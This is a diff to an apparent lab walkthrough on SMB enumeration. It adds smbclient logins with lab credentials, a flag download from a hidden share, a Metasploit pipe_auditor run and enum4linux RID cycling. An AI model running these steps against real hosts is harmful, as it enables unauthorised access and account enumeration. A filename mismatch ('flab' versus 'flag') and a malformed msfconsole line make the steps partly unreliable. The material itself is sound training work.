@@ -248,16 +248,37 @@ smbmap -H [ip] -u admin -p password1
 ```
 smbclient -L [ip] -U jane 
 password: abc123
+
+smbclient //[ip]/jane -U jane
+password: abc123
 ```
 
 6.  Fetch the flag from share “admin”
-
+```
+smbclient //[ip]/admin -U admin
+password: password1
+cd hidden
+get flab.tar.gz
+exit
+ls
+tar -xf flag.tar.gz
+ls
+cat flag
+```
 
 7.  List the named pipes available over SMB on the samba server? Use  pipe_auditor metasploit module with credentials obtained from question 2.
-
+```
+msfconsole - use auxiliary/scanner/smb/pipe_auditor
+set smbuser admin
+set smbpass password1
+set rhosts [ip]
+run
+```
 
 8.  List sid of Unix users shawn, jane, nancy and admin respectively by performing RID cycling  using enum4Linux with credentials obtained in question 2.
-
+``` 
+enum4linux -r -u "admin" -p "password1" [ip] 
+```
 
 
 
